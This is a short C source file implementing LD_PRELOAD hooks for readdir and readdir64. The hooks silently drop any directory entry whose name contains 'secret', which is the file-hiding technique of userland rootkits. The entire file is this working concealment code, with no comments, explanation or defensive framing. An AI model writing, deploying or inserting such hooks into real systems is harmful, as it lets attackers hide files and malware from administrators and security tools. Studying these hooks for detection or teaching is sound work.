#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <string.h>
#include <dirent.h>

typedef struct dirent *(*orig_readdir_type)(DIR *);

struct dirent *readdir(DIR *dirp) {
    static orig_readdir_type orig_readdir = NULL;
    struct dirent *entry;

    if (!orig_readdir) {
        orig_readdir = (orig_readdir_type)dlsym(RTLD_NEXT, "readdir");
    }

    do {
        entry = orig_readdir(dirp);
        if (entry == NULL) break;
    } while (strstr(entry->d_name, "secret") != NULL);

    return entry;
}

typedef struct dirent64 *(*orig_readdir64_type)(DIR *);

struct dirent64 *readdir64(DIR *dirp) {
    static orig_readdir64_type orig_readdir64 = NULL;
    struct dirent64 *entry;

    if (!orig_readdir64) {
        orig_readdir64 = (orig_readdir64_type)dlsym(RTLD_NEXT, "readdir64");
    }

    do {
        entry = orig_readdir64(dirp);
        if (entry == NULL) break;
    } while (strstr(entry->d_name, "secret") != NULL);

    return entry;
}